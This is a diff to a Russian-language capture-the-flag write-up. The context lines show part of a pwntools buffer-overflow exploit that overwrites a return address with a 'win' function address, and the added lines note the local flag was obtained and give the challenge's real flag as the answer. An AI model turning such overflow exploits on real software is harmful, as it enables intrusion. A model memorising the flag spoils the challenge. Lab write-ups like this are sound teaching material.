@@ -24,7 +24,7 @@ p.sendline(b"AAAAAAAA" + p64(win_addr))
 p.interactive()
 ```
 ![image](https://github.com/user-attachments/assets/3c1fb947-80b9-4342-8877-bdba66f5c8e5)
-
+Получить локальный флаг удалось, теперь получим настоящий флаг: <br>
 ```py
 from pwn import *
 
@@ -34,5 +34,8 @@ p.sendline(b"AAAAAAAA" + p64(win_addr))
 p.interactive()
 ```
 ![image](https://github.com/user-attachments/assets/8a9d397a-944e-4fab-ad4a-c0f2d95bfd25)
+
+Ответ: `spbctf{9c4ef124c0624b2ddbe6eb58f8be045a}`
+
 
 
